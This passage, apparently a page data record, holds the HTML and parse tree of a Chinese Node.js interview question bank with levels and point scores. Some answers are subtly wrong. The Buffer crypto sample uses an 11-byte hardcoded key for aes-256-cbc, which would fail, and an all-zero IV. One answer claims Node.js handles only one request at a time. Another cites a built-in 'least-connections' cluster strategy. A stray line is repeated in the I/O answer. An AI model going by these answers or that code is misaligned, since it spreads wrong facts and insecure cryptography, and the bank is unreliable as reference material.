分）</h4>\\n<ul>\\n<li><p>T后端开发，Nodejs的异步I/O天生适合做Web高并发。</p>\\n</li>\\n<li><p>BFF开发，比如SSR中间层或者GraphQL中间层。</p>\\n</li>\\n<li><p>前端基建，Webpack、Gulp、Babel、Jest等等前端工程化的工具或插件。</p>\\n</li>\\n</ul>\\n<h2>2. Nodejs的事件循环和浏览器有什么区别？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（3 分）</h4>\\n<p>Node.js 的事件循环和浏览器中的事件循环的区别在于，浏览器的异步任务分为宏任务队列和微任务队列，而Nodejs的异步任务分成了6个任务队列，按执行顺序分别为：</p>\\n<ul>\\n<li><p>timers阶段：处理setTimeout()和setInterval()等定时器事件。</p>\\n</li>\\n<li><p>I/O callbacks阶段：处理几乎所有的异步I/O回调，例如网络I/O、文件I/O等。</p>\\n</li>\\n<li><p>idle, prepare阶段：这是Node.js内部使用的，开发者很少会用到。</p>\\n</li>\\n<li><p>poll阶段：轮询阶段，用于等待新的I/O事件，执行I/O回调。</p>\\n</li>\\n<li><p>check阶段：执行setImmediate()的回调函数。</p>\\n</li>\\n<li><p>close callbacks阶段：执行关闭事件的回调函数，例如socket.on(&#39;close&#39;)。</p>\\n</li>\\n</ul>\\n<h2>3. Nodejs的内存泄漏排查方法有哪些？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（3 分）</h4>\\n<p>Node.js的内存泄漏排查方法有以下几种：</p>\\n<ul>\\n<li><p>使用Node.js自带的内存分析工具，如<code>process.memoryUsage()</code>和<code>heapdump</code>模块。</p>\\n</li>\\n<li><p>使用第三方内存分析工具，如Chrome DevTools、VisualVM等。</p>\\n</li>\\n<li><p>使用内存泄漏检测工具，如<code>leak</code>、<code>memwatch</code>等。</p>\\n</li>\\n<li><p>使用代码审查和静态分析工具，如ESLint、JSHint等。</p>\\n</li>\\n<li><p>使用单元测试和集成测试，确保代码的正确性和稳定性。</p>\\n</li>\\n</ul>\\n<h2>4. Nodejs的进程管理有哪些方法？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（3 分）</h4>\\n<p>Node.js的进程管理有以下几种方法：</p>\\n<ul>\\n<li><p>使用<code>child_process</code>模块创建子进程，并使用<code>process</code>模块进行进程间通信。</p>\\n</li>\\n<li><p>使用<code>cluster</code>模块创建集群，利用多核CPU资源。</p>\\n</li>\\n<li><p>使用<code>pm2</code>等第三方进程管理工具，如自动重启、负载均衡、日志管理等功能。</p>\\n</li>\\n<li><p>使用<code>forever</code>等第三方工具，如自动重启、日志管理等功能。</p>\\n</li>\\n<li><p>使用<code>node-mac</code>等第三方工具，如自动重启、日志管理等功能。</p>\\n</li>\\n</ul>\\n<h2>5. Nodejs的模块化有哪些方法？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（3 分）</h4>\\n<p>Node.js的模块化有以下几种方法：</p>\\n<ul>\\n<li><p>CommonJS模块化：使用<code>require</code>和<code>module.exports</code>进行模块导入和导出。</p>\\n</li>\\n<li><p>ES6模块化：使用<code>import</code>和<code>export</code>进行模块导入和导出。</p>\\n</li>\\n<li><p>AMD模块化：使用<code>define</code>和<code>require</code>进行模块导入和导出。</p>\\n</li>\\n<li><p>UMD模块化：兼容CommonJS和AMD模块化。</p>\\n</li>\\n<li><p>全局变量：将变量挂载到<code>global</code>对象上，方便全局访问。</p>\\n</li>\\n<li><p>命名空间：将变量挂载到命名空间对象上，避免全局变量污染。</p>\\n</li>\\n<li><p>模块打包：使用Webpack、Rollup等工具将模块打包成一个文件，方便部署和分发。</p>\\n</li>\\n</ul>\\n<h2>6. 讲一下常见的Nodejs框架？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（3 分）</h4>\\n<ul>\\n<li><p>Koa：一个轻量的Nodejs框架，代码非常简洁。采用洋葱圈模型中间件，非常方便扩展功能，但是开发后端API需要进行再封装。</p>\\n</li>\\n<li><p>Express：Express也是一个轻量框架，Express和Koa的区别在于中间件机制。但总体差别不是很大，绝大多数Nodejs框架都是在Koa或者Express基础上封装的。</p>\\n</li>\\n<li><p>Eggjs：基于Koa封装的框架，整合了数据库、路由、安全防护、日志记录、异常处理等中间件，可以用来快速开发Rest或者Restful API项目。</p>\\n</li>\\n<li><p>Nestjs：基于TS,使用了大量的装饰器语法，开发体验类似于Java的Springboot。除此之外，Nestjs还提供了GraphQL、WebSocket、各种MQ和微服务的解决方案，比较适合大型后端项目的开发。</p>\\n</li>\\n</ul>\\n<h2>7. Nodejs的异步编程有哪些方法？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（3 分）</h4>\\n<p>Node.js的异步编程有以下几种方法：</p>\\n<ul>\\n<li><p>回调函数：将异步操作的结果作为回调函数的参数传递给回调函数。</p>\\n</li>\\n<li><p>Promise：将异步操作的结果封装成一个Promise对象，通过then和catch方法处理异步操作的结果。</p>\\n</li>\\n<li><p>async/await：将异步操作的结果封装成一个Promise对象，通过await关键字等待异步操作的结果。</p>\\n</li>\\n<li><p>Generator：将异步操作的结果封装成一个Generator对象，通过yield关键字等待异步操作的结果。</p>\\n</li>\\n<li><p>流程控制库：如<code>async</code>、<code>bluebird</code>、<code>co</code>等库，提供了更方便的异步编程方式。</p>\\n</li>\\n<li><p>事件驱动：通过事件驱动的方式处理异步操作，如<code>EventEmitter</code>、<code>Stream</code>等。</p>\\n</li>\\n</ul>\\n<h2>8. Nodejs的文件系统有哪些方法？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（3 分）</h4>\\n<p>Node.js的文件系统有以下几种方法：</p>\\n<ul>\\n<li><p><code>fs.readFile</code>：读取文件内容。</p>\\n</li>\\n<li><p><code>fs.writeFile</code>：写入文件内容。</p>\\n</li>\\n<li><p><code>fs.appendFile</code>：追加文件内容。</p>\\n</li>\\n<li><p><code>fs.unlink</code>：删除文件。</p>\\n</li>\\n<li><p><code>fs.rename</code>：重命名文件。</p>\\n</li>\\n<li><p><code>fs.stat</code>：获取文件信息。</p>\\n</li>\\n<li><p><code>fs.readdir</code>：读取目录内容。</p>\\n</li>\\n<li><p><code>fs.mkdir</code>：创建目录。</p>\\n</li>\\n<li><p><code>fs.rmdir</code>：删除目录。</p>\\n</li>\\n<li><p><code>fs.watch</code>：监听文件或目录的变化。</p>\\n</li>\\n</ul>\\n<h2>9. 什么是Stream流，有哪些应用场景？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><p>Stream是一种处理流式数据的抽象接口，用于读取、写入、转换和操作数据流。它是一个基于事件的 API，可以让我们以高效、低延迟的方式处理大型数据集。</p>\\n</li>\\n<li><p>比如读取文件，使用流我们可以一点一点来读取文件，每次只读取或写入文件的一小部分数据块，而不是一次性将整个文件读取或写入到内存中或磁盘中，这样做能够降低内存占用。</p>\\n</li>\\n</ul>\\n<h2>10. 什么是BFF？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（1 分）</h4>\\n<ul>\\n<li><p>BFF（Backend For Frontend）是中间层，由前端同学开发的后端项目。</p>\\n</li>\\n<li><p>最常见的BFF项目像SSR和GraphQL。SSR用来解决SEO问题，GraphQL用来聚合数据，解决API查询的问题。</p>\\n</li>\\n</ul>\\n<h2>11. 什么是ORM？Nodejs的ORM框架有哪些？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（3 分）</h4>\\n<ul>\\n<li><p>ORM框架是通过对SQL语句进行封装，并将数据库的数据表和用户代码里的模型对象进行自动映射。</p>\\n</li>\\n<li><p>这样开发者使用时只需要调用模型对象的方法就能实现对数据库的增删改查，不用手写太多的SQL了。</p>\\n</li>\\n<li><p>Nodejs的ORM框架有Sequelize、TypeORM、Mongoose等。</p>\\n</li>\\n</ul>\\n<h2>12. 什么是微服务？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（1 分）</h4>\\n<ul>\\n<li><p>微服务是一种架构风格，将一个大型应用拆分成多个小型、独立、可部署的服务，每个服务都运行在自己的进程中，并使用轻量级的通信机制（如HTTP、消息队列等）进行通信。</p>\\n</li>\\n<li><p>微服务架构的优点是每个服务都可以独立开发、部署和扩展，提高了开发效率和系统的可维护性。</p>\\n</li>\\n</ul>\\n<h2>13. 请介绍一下require的模块加载机制？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><p>先计算模块路径</p>\\n</li>\\n<li><p>如果模块在缓存里面，取出缓存</p>\\n</li>\\n<li><p>如果是内置模块，取出内置模块</p>\\n</li>\\n<li><p>加载模块</p>\\n</li>\\n<li><p>输出模块的exports属性即可</p>\\n</li>\\n</ul>\\n<h2>14. Node.js的优点是什么？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><p>异步编程模型：Node.js采用了事件驱动、非阻塞I/O模型，使其能够在大量连接的情况下保持高性能和稳定性。</p>\\n</li>\\n<li><p>单一编程语言：Node.js使用的是JavaScript，这是一种被广大开发者所熟悉的语言，能够大大降低学习成本。</p>\\n</li>\\n<li><p>开源社区活跃：Node.js有一个非常活跃的开源社区，有大量的模块可供使用，极大地提高了开发效率。</p>\\n</li>\\n<li><p>跨平台性：Node.js可以在多种操作系统上运行，如Windows、Linux、macOS等。</p>\\n</li>\\n<li><p>高性能：由于Node.js的非阻塞I/O模型，使其在处理大量并发请求时具有极高的性能。</p>\\n</li>\\n<li><p>数据密集型应用：Node.js擅长处理数据密集型应用，如实时通信、实时流媒体、实时游戏等。</p>\\n</li>\\n</ul>\\n<h2>15. Node.js采用哪种编程模式？它的优势是什么？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><p>Node.js采用的是事件驱动编程模式，这种模式使得Node.js能够在不需要等待I/O操作完成的情况下继续执行其他的任务。这样做的好处是可以提高系统的吞吐量，尤其是在处理高并发的网络请求时，能够大大提高响应速度。</p>\\n</li>\\n<li><p>此外，Node.js还支持回调函数、Promise和async/await等不同的异步编程方式，可以根据具体的应用场景灵活选择合适的编程方式。这样做的好处是可以提高代码的可读性和可维护性，同时也能够更好地控制代码的执行流程。</p>\\n</li>\\n<li><p>总的来说，Node.js的事件驱动编程模式和灵活的异步编程方式为其带来了高效、稳定和易用的优势。</p>\\n</li>\\n</ul>\\n<h2>16. 解释一下Event Loop的工作原理？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><p>Event Loop是Node.js实现异步编程的关键部分，它负责管理所有的事件和回调函数。</p>\\n</li>\\n<li><p>当一个事件触发时，Event Loop会将相关的回调函数放入队列中等待执行。这些回调函数按照一定的优先级进行排列，一旦执行环境空闲，Event Loop就会开始执行队列中的下一个回调函数。</p>\\n</li>\\n<li><p>当一个回调函数执行完毕后，Event Loop会重新检查队列，看是否有新的事件需要处理。如果有，它会将相关的回调函数放入队列中；如果没有，它则会进入等待状态，直到有新的事件发生。</p>\\n</li>\\n</ul>\\n<h2>17. node.js的同步和异步编程是什么意思？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><p>同步编程指的是程序按照顺序依次执行的方式。在这种方式下，程序会逐行地执行代码，并且在某条代码执行完毕之前，其他后续代码都会暂停等待。这种方式适用于那些顺序依赖性强、逻辑复杂度低的情况。</p>\\n</li>\\n<li><p>而异步编程则是指程序在同一时间内可以并行执行多个任务的方式。在这种方式下，程序可以不按顺序地执行代码，并且可以在某些任务未完成时就开始执行其他任务。这种方式适用于那些顺序依赖性较弱、并发性要求较高的情况。</p>\\n</li>\\n<li><p>Node.js主要支持异步编程，并且通过Event Loop机制实现了高效的并发能力。然而，为了兼容其他编程风格，也支持一些同步编程的功能。</p>\\n</li>\\n</ul>\\n<h2>18. 解释一下Node.js的Express框架及其主要组件?</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（3 分）</h4>\\n<ul>\\n<li><p>Express是一个基于Node.js的web应用程序框架，它可以帮助开发人员快速构建Web服务。它的主要组件包括：</p>\\n</li>\\n<li><p>Router：路由器，用于定义路由规则，根据URL的不同路径映射到不同的处理器。</p>\\n</li>\\n<li><p>Middleware：中间件，用于拦截HTTP请求，并对其进行预处理或后处理。</p>\\n</li>\\n<li><p>View engine：视图引擎，用于渲染HTML模板。</p>\\n</li>\\n<li><p>Body-parser：用于解析POST请求体中的内容，如表单数据和JSON数据。</p>\\n</li>\\n<li><p>Cors：跨域资源共享模块，允许客户端向不同域名的服务器发起请求。</p>\\n</li>\\n<li><p>Static：静态文件服务器，用于托管静态文件，如图片、CSS和JavaScript文件。</p>\\n</li>\\n<li><p>Express还支持自定义错误处理器、HTTP中间件等功能，使得开发者可以轻松地搭建出高质量的Web服务。</p>\\n</li>\\n</ul>\\n<h2>19.你如何在Node.js中使用中间件来组织代码？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（3 分）</h4>\\n<ul>\\n<li><p>在 Node.js 中使用中间件可以有效地组织代码，使代码更易于理解和维护。中间件是 Node.js 应用程序的一个重要组成部分，它们负责执行异步操作、处理请求和响应等任务。 使用中间件的一般步骤如下：</p>\\n</li>\\n<li><p>定义中间件函数。中间件函数接受三个参数：request 对象、response 对象和 next 函数。其中，next 函数用于通知中间件链中的下一个中间件或最终的路由处理器继续执行。</p>\\n</li>\\n<li><p>使用 app.use() 方法注册全局中间件。全局中间件对所有路由都有效，通常用于进行身份验证、日志记录等操作。</p>\\n</li>\\n<li><p>使用 router.use() 方法注册局部中间件。局部中间件只对特定的路由有效，通常用于处理与该路由相关的业务逻辑。</p>\\n</li>\\n<li><p>在应用程序的主文件中引入并启动中间件。在主文件中，需要使用 require() 方法引入中间件文件，并使用 app.listen() 方法启动中间件。</p>\\n</li>\\n</ul>\\n<h2>20.你如何在Node.js中处理HTTP请求和响应？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（3 分）</h4>\\n<ul>\\n<li><p>创建 HTTP 服务端程序。首先需要使用 http 模块创建一个 HTTP 服务端程序，并设置相应的回调函数.</p>\\n</li>\\n<li><p>监听 HTTP 请求事件。然后需要使用 http.createServer() 方法创建一个 HTTP 服务实例，并监听 request 事件以接收客户端发送来的 HTTP 请求。</p>\\n</li>\\n<li><p>处理 HTTP 请求。当接收到 HTTP 请求时，需要解析请求头、查询字符串以及请求体中的数据，并根据请求的方法和路径来确定具体的响应内容。</p>\\n</li>\\n<li><p>发送响应到客户端。最后需要使用 response.end() 方法将响应发送回客户端。</p>\\n</li>\\n<li><p>通过以上步骤，可以在 Node.js 中有效地处理 HTTP 请求和响应，为用户提供丰富的 Web 功能和服务。\\n需要注意的是，由于 Node.js 是单线程模型，因此在同一时刻只能处理一个请求。为了能够同时处理多个请求，可以通过集群、负载均衡等方式将多个请求分发到不同的 Node.js 进程中进行处理。</p>\\n</li>\\n</ul>\\n<h2>21.请解释一下Node.js的集群化工作模式？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（3 分）</h4>\\n<ul>\\n<li><p>Node.js 的集群化工作模式是一种利用多个进程同时运行 Node.js 应用来实现负载均衡的技术。它可以充分利用多核 CPU 的计算能力，并且可以减少单个进程的压力，从而提高应用的可用性和性能。\\n在 Node.js 中，可以使用内置的 cluster 模块来创建多个子进程，每个子进程都可以独立地运行 Node.js 应用。在主进程中，可以使用 cluster.fork() 方法创建一个新的子进程，并将其绑定到一个端口上。当有新的连接请求到达时，Node.js 会根据当前的负载情况将请求分发到一个空闲的子进程中进行处理。</p>\\n</li>\\n<li><p>此外，Node.js 还提供了一些内置的策略来实现负载均衡，如 round-robin 和 least-connections 等。用户可以根据自己的实际需求选择合适的负载均衡策略，以达到最佳的效果。</p>\\n</li>\\n<li><p>总之，Node.js 的集群化工作模式可以有效地提高应用的性能和可用性，特别是在处理大量并发请求时尤其有用。</p>\\n</li>\\n</ul>\\n<h2>22.讲一下EventEmitter？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（3 分）</h4>\\n<ul>\\n<li><p>Node.js 的大多数核心模块都是基于EventEmitter实现的，如 http、net、fs，很多第三方库也是基于EventEmitter实现的，如socket.io、nodemailer、cheerio等。</p>\\n</li>\\n<li><p>使用EventEmitter的好处是可以用事件的形式来处理异步任务，可以大大简化代码，并且容易处理异常。</p>\\n</li>\\n<li><p>举个例子来看看为什么Nodejs里大多数模块都要继承EventEmitter。</p>\\n</li>\\n<li><p>这是不使用EventEmitter实现的文件读取，所有逻辑都放在一个回调函数里：</p>\\n</li>\\n</ul>\\n<pre><code class=\\"language-js\\">const fs = require(&#39;fs&#39;);\\n\\nfs.readFile(&#39;file.txt&#39;, (err, data) =&gt; {\\n  if (err) {\\n    console.error(`Failed to read file: ${err}`);\\n  } else {\\n    console.log(`File content: ${data}`);\\n  }\\n});\\n</code></pre>\\n<ul>\\n<li>这是使用EventEmitter的文件读取：</li>\\n</ul>\\n<pre><code class=\\"language-js\\">const fs = require(&#39;fs&#39;);\\n\\nconst stream = fs.createReadStream(&#39;file.txt&#39;);\\n\\nstream.on(&#39;data&#39;, (chunk) =&gt; {\\n  console.log(`Received ${chunk.length} bytes of data.`);\\n});\\n\\nstream.on(&#39;end&#39;, () =&gt; {\\n  console.log(&#39;Finished reading file.&#39;);\\n});\\n</code></pre>\\n<ul>\\n<li>很显然，使用EventEmitter之后，处理文件和处理异常的逻辑就被分开了，代码可读性和可维护性都提升了。</li>\\n</ul>\\n<h2>23.Buffer怎么理解，有什么应用？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（3 分）</h4>\\n<ul>\\n<li><p>Buffer对象是一个类似于数组的对象，它的每个元素都是一个表示 8 位字节的整数。</p>\\n</li>\\n<li><p>可以将其看作是一个字节数组，用来存储和操作二进制数据。</p>\\n</li>\\n<li><p>应用场景：</p>\\n</li>\\n<li><p>网络通信：可以使用Buffer.from()方法将字符串转换为二进制数据，然后使用net模块进行网络通信：</p>\\n</li>\\n</ul>\\n<pre><code class=\\"language-js\\">const net = require(&#39;net&#39;);\\n\\nconst client = net.createConnection({ port: 8080 }, () =&gt; {\\n  // 将字符串转换为二进制数据\\n  const data = Buffer.from(&#39;Hello, world!&#39;, &#39;utf8&#39;);\\n\\n  // 发送数据\\n  client.write(data);\\n});\\n</code></pre>\\n<ul>\\n<li>文件操作，用Buffer来存储文件数据：</li>\\n</ul>\\n<pre><code class=\\"language-js\\">const fs = require(&#39;fs&#39;);\\n\\n// 读取文件，并将数据存储到 Buffer 对象中\\nconst data = fs.readFileSync(&#39;/path/to/file&#39;);\\n\\n// 处理数据\\n// ...\\n</code></pre>\\n<ul>\\n<li>加密解密，例如，可以使用 crypto 模块创建加密解密算法需要的二进制数据：</li>\\n</ul>\\n<pre><code class=\\"language-js\\">\\nconst crypto = require(&#39;crypto&#39;);\\n\\n// 创建加密解密算法需要的二进制数据\\nconst key = Buffer.from(&#39;mysecretkey&#39;, &#39;utf8&#39;);\\nconst iv = Buffer.alloc(16);\\n\\n// 创建加密解密算法对象\\nconst cipher = crypto.createCipheriv(&#39;aes-256-cbc&#39;, key, iv);\\n\\n// 加密数据\\nconst encrypted = Buffer.concat([cipher.update(data), cipher.final()]);\\n</code></pre>\\n<ul>\\n<li>图像处理：</li>\\n</ul>\\n<pre><code class=\\"language-js\\">\\nconst fs = require(&#39;fs&#39;);\\nconst sharp = require(&#39;sharp&#39;);\\n\\n// 读取图片文件，并将数据存储到 Buffer 对象中\\nconst data = fs.readFileSync(&#39;/path/to/image&#39;);\\n\\n// 处理图片\\nsharp(data)\\n  .resize(200, 200)\\n  .toFile(&#39;/path/to/resized-image&#39;, (err, info) =&gt; {\\n    // ...\\n  });\\n</code></pre>\\n<h2>24. 什么是I/O？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（3 分）</h4>\\n<ul>\\n<li><p>概念：计算机里所谓的I/O指的是输入和输出，但对于前端同学而言，这个定义可能不太好理解。简单点说，需要等待的任务都可以称为I/O任务，比如前端的事件处理、网络请求、定时器，后端的文件处理、网络请求、数据库操作，这些都属于I/O任务。</p>\\n</li>\\n<li><p>异步I/O：以网络请求任务为例，传统的同步I/O指的是一个一个排队执行，一个执行完了再执行下一个，即使线程空闲，也不能执行其他任务。</p>\\n</li>\\n<li><p>而异步I/O会返回一个标记，告诉调用者 I/O 操作已经开始，但不会阻塞线程。当 I/O 操作完成时，会调用注册的回调函数，将结果返回给调用者。</p>\\n</li>\\n<li><p>网络通信：可以使用Buffer.from()方法将字符串转换为二进制数据，然后使用net模块进行网络通信：</p>\\n</li>\\n<li><p>异步I/O使得程序在执行 I/O 操作时不必等待，提高了程序的并发性能。</p>\\n</li>\\n<li><p>听起来异步I/O很好，那为什么同步I/O依然会存在？</p>\\n</li>\\n<li><p>传统的同步I/O操作比异步I/O操作更容易理解和编写。异步编程需要开发人员具备较高的技能水平，以及对事件循环、回调函数等概念的深入理解。</p>\\n</li>\\n<li><p>对于某些小规模的应用程序或者一些低频次的I/O操作，使用异步I/O可能不会带来很大的性能提升，而且可能会增加代码的复杂性</p>\\n</li>\\n<li><p>对于一些CPU密集型任务，传统I/O操作可能比异步I/O更快，因为异步I/O 会在I/O操作执行期间增加额外的上下文切换和事件处理负担，从而降低了程序的性能。</p>\\n</li>\\n<li><p>CPU密集和I/O密集：</p>\\n</li>\\n<li><p>CPU密集任务指的是纯计算任务。</p>\\n</li>\\n<li><p>I/O密集的任务指的是需要等待的任务。所谓的高并发，显然属于I/O密集型任务。</p>\\n</li>\\n</ul>\\n","ast":[{"type":"heading","raw":"# Node\\n\\n","depth":1,"text":"Node","tokens":[{"type":"text","raw":"Node","text":"Node","escaped":false}]},{"type":"heading","raw":"## 1. Nodejs适用于哪些场景？\\n\\n","depth":2,"text":"1. Nodejs适用于哪些场景？","tokens":[{"type":"text","raw":"1. Nodejs适用于哪些场景？","text":"1. Nodejs适用于哪些场景？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（3 分）\\n\\n","depth":4,"text":"解答（3 分）","tokens":[{"type":"text","raw":"解答（3 分）","text":"解答（3 分）","escaped":false}]},{"type":"list","raw":"- T后端开发，Nodejs的异步I/O天生适合做Web高并发。\\n\\n- BFF开发，比如SSR中间层或者GraphQL中间层。\\n\\n- 前端基建，Webpack、Gulp、Babel、Jest等等前端工程化的工具或插件。","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- T后端开发，Nodejs的异步I/O天生适合做Web高并发。\\n\\n","task":false,"loose":true,"text":"T后端开发，Nodejs的异步I/O天生适合做Web高并发。\\n","tokens":[{"type":"text","raw":"T后端开发，Nodejs的异步I/O天生适合做Web高并发。\\n","text":"T后端开发，Nodejs的异步I/O天生适合做Web高并发。","tokens":[{"type":"text","raw":"T后端开发，Nodejs的异步I/O天生适合做Web高并发。","text":"T后端开发，Nodejs的异步I/O天生适合做Web高并发。","escaped":false}]}]},{"type":"list_item","raw":"- BFF开发，比如SSR中间层或者GraphQL中间层。\\n\\n","task":false,"loose":true,"text":"BFF开发，比如SSR中间层或者GraphQL中间层。\\n","tokens":[{"type":"text","raw":"BFF开发，比如SSR中间层或者GraphQL中间层。\\n","text":"BFF开发，比如SSR中间层或者GraphQL中间层。","tokens":[{"type":"text","raw":"BFF开发，比如SSR中间层或者GraphQL中间层。","text":"BFF开发，比如SSR中间层或者GraphQL中间层。","escaped":false}]}]},{"type":"list_item","raw":"- 前端基建，Webpack、Gulp、Babel、Jest等等前端工程化的工具或插件。","task":false,"loose":true,"text":"前端基建，Webpack、Gulp、Babel、Jest等等前端工程化的工具或插件。","tokens":[{"type":"text","raw":"前端基建，Webpack、Gulp、Babel、Jest等等前端工程化的工具或插件。","text":"前端基建，Webpack、Gulp、Babel、Jest等等前端工程化的工具或插件。","tokens":[{"type":"text","raw":"前端基建，Webpack、Gulp、Babel、Jest等等前端工程化的工具或插件。","text":"前端基建，Webpack、Gulp、Babel、Jest等等前端工程化的工具或插件。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 2. Nodejs的事件循环和浏览器有什么区别？\\n\\n","depth":2,"text":"2. Nodejs的事件循环和浏览器有什么区别？","tokens":[{"type":"text","raw":"2. Nodejs的事件循环和浏览器有什么区别？","text":"2. Nodejs的事件循环和浏览器有什么区别？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（3 分）\\n\\n","depth":4,"text":"解答（3 分）","tokens":[{"type":"text","raw":"解答（3 分）","text":"解答（3 分）","escaped":false}]},{"type":"paragraph","raw":"Node.js 